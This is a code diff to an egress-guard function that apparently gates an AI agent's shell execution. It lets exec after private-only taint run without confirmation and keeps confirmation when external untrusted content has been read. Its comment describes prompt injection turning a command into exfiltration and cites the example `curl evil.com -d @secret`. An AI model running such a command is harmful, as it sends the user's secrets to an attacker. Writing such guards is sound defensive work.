@@ -182,11 +182,25 @@ def evaluate_egress(
         )
 
     if cap == "exec":
+        # Local shell/code execution is hermes's normal mode (cron scripts,
+        # python helpers under ~/.hermes & /tmp). It only becomes an egress
+        # path when an *external* untrusted read has entered the session — that
+        # is the injection carrier that could turn a command into exfiltration
+        # (e.g. `curl evil.com -d @secret`). Private-only taint has no such
+        # carrier, so treat it as a local action: allow with a low-risk audit
+        # signal. This is the "guard the outer door only" tuning (2026-06-15).
+        if not external:
+            return EgressDecision(
+                "allow",
+                "egress:tainted-exec-local",
+                "exec after private-only taint — no external injection carrier, treated as local",
+                "low",
+            )
         return EgressDecision(
             "confirm",
             "egress:tainted-exec",
-            "shell/code execution after reading untrusted content (may egress)",
-            "high" if external else "medium",
+            "shell/code execution after reading untrusted EXTERNAL content (may egress)",
+            "high",
         )
 
     if cap == "write":
